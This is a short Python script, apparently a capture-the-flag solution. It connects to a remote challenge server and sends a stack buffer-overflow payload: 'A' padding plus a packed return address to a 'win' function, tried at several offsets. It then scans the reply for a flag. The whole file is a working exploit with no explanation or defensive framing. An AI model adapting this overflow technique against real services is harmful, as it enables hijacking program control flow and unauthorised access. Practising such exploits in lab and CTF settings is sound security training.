import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 45984
WIN = 0x080491D6
for off in (36, 32, 44):
    try:
        s = socket.create_connection((HOST, PORT), timeout=12)
        s.settimeout(5)
        time.sleep(0.6)
        try:
            s.recv(4096)
        except Exception:
            pass
        payload = b"A" * off + struct.pack("<I", WIN)
        s.sendall(payload + b"\n")
        time.sleep(0.8)
        out = b""
        try:
            out = s.recv(65536)
        except Exception:
            pass
        txt = out.decode("utf-8", "replace")
        print(f"--- off={off} ---")
        print(txt[:400])
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
        if m:
            print("FLAG:", m.group(0))
            s.close()
            break
        s.close()
    except Exception as e:
        print(off, "err", type(e).__name__)
